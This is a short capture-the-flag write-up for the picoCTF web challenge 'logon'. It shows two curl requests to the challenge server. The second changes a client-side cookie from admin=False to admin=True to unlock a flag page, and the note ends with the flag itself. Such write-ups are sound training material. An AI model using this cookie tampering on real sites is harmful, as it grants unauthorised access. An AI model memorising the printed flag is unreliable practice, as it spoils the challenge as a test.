# logon
## Category
Web Exploitation
## Problem Description
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/15796/ ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
## Approach
Try logging in using Joe as username and from the network tab of inspect element copy as curl the link of file flag.
```
curl 'https://jupiter.challenges.picoctf.org/problem/15796/flag' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://jupiter.challenges.picoctf.org/problem/15796/' -H 'Connection: keep-alive' -H 'Cookie: _ga=GA1.2.1905962877.1654003369; __cf_bm=8_mUrjCd79YdEhLtNwim.xDhe7upQj9gIZbclp3TT3E-1656037399-0-AcSs2cK0Uh8m2t48qUhtN0QnX3l9xa6mkckvq/ja1WTx4j2b/8uwW1Za2HmEQIpqQQiFpabaUW0+w87OwqlOoSdtcRYPQgYwWrKq4odKAtOFsEXZA8Tty/uTHd/A6AuYuLRJDV0AbDUgFox/YbVPP6UPvldaKfJvfqU1migB05+j; _gid=GA1.2.348668275.1656037401; _gat=1; password=1234; username=joe; admin=False' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1'
```
Change admin=False to admin=True and view compressed form to obtain the flag.
```
curl 'https://jupiter.challenges.picoctf.org/problem/15796/flag' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://jupiter.challenges.picoctf.org/problem/15796/' -H 'Connection: keep-alive' -H 'Cookie: _ga=GA1.2.1905962877.1654003369; __cf_bm=8_mUrjCd79YdEhLtNwim.xDhe7upQj9gIZbclp3TT3E-1656037399-0-AcSs2cK0Uh8m2t48qUhtN0QnX3l9xa6mkckvq/ja1WTx4j2b/8uwW1Za2HmEQIpqQQiFpabaUW0+w87OwqlOoSdtcRYPQgYwWrKq4odKAtOFsEXZA8Tty/uTHd/A6AuYuLRJDV0AbDUgFox/YbVPP6UPvldaKfJvfqU1migB05+j; _gid=GA1.2.348668275.1656037401; _gat=1; password=1234; username=joe; admin=True' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --compressed

```
## Flag
picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}
